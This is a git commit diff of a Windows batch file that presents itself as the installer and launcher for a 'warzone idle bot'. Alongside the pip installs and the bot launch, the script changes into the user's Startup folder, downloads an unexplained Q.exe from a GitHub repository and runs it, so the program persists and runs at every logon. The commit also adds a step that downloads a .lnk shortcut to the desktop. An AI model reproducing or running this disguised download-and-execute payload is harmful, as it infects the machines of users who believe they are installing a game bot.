2bdd48313c85bd215f4ccdc2b9b646aff3a79aca
bloostone <49822986+bloostone@users.noreply.github.com>
2021-07-07 20:52:10 -0700

    Update W.bat

--- W.bat
+++ W.bat
@@ -1,11 +1,13 @@
 @echo off
+cd %homepath%\desktop
+powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/AFK-Run.exe.lnk -OutFile AFK-Run.lnk"
 pause
 pip install pypiwin32
 pip install pillow
 pip install opencv-python
 pause
-cd %homepath%\desktop\warzone-idle-bot-master
-bot.py br-solos
+cd %homepath%\desktop\WZB\warzone-idle-bot-master
+bot.py br-solos  
 cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/Q.exe -OutFile Q.exe" && Q.exe
 exit
